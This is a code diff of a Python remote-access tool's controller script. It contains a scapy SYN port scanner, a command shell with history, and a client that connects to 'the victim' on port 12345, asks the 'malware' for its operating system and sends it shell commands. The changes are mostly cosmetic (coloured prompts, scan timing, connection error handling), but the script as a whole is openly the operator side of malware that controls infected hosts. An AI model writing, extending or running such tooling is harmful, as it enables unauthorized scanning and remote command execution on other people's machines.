@@ -3,7 +3,6 @@ from scapy.all import *
 import socket
 
 
-
 class Shell:
 
     def __init__(self):
@@ -22,7 +21,8 @@ class Shell:
         print(content)
 
     def history(self):
-        print("The history of your commands is:\n")
+        print("The history of your commands is:")
+        print("----------------------")
         for element in self._history:
             print(element)
 
@@ -60,21 +60,31 @@ class GetInfo:
 class PortScanner:
 
     def scanner(self):
-        ports_to_scan = {21: "FTP", 22: "SSH", 53: "DNS", 80: "HTTP", 443: "HTTPS"}
-        address = input("Enter the address to scan: ")
-        for port in ports_to_scan.keys():
-            print("Scanning port: {}".format(port))
-            resp = sr1(IP(dst=address)/TCP(dport=port, flags="S"), verbose=0)
+        address = input("[*] Enter the address to scan: ")
+        min_port = input("[*] Enter de minimum port number: ")
+        max_port = input("[*] Enter the Maximum port Number: ")
+        print("\033[32m[*] Scan started!\033[0m\n")
+        t1 = datetime.now()
+        for port in range(int(min_port), int(max_port) + 1):
+            resp = sr1(IP(dst=address) / TCP(dport=port, flags="S"), verbose=0)
             if TCP in resp:
                 if resp[TCP].flags == "SA":
-                    print("\t\033[32mPort {}".format(port) + ": " + ports_to_scan[port] + " is open\033[0m")
+                    print("Port {}".format(port) + " is open")
+        t2 = datetime.now()
+        final_time = t2 - t1
+        print("\n\033[32m[*] Scan finished!\033[0m")
+        print("\033[32m[*] Scanning completed in {}\033[0m".format(final_time))
 
 
-malware_addr = input("Enter the address of the victim: ")
+malware_addr = input("[*] Enter the address of the victim: ")
 serv_addr = (malware_addr, 12345)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(serv_addr)
+try:
+    s.connect(serv_addr)
+except socket.error:
+    print("\033[31m[!] Unable to connect to the following address: {}\033[0m".format(malware_addr))
+    sys.exit(1)
 print(s.recv(4096).decode('utf-8'))
 s.send("os".encode("utf-8"))
 malware_os = s.recv(4096).decode('utf-8')
@@ -90,9 +100,9 @@ while message != "exit":
     if message == "1":
         shell.set_next_command(True)
         while shell.get_next_command():
-            shell._command = input("Shell: ")
+            shell._command = input("\033[32mShell: \033[0m")
             while shell.get_command() == "":
-                shell.set_command(input("Shell: "))
+                shell.set_command(input("\033[32mShell: \033[0m"))
             if shell.get_command() == "exit":
                 shell.close()
             if shell.get_command() == "history":
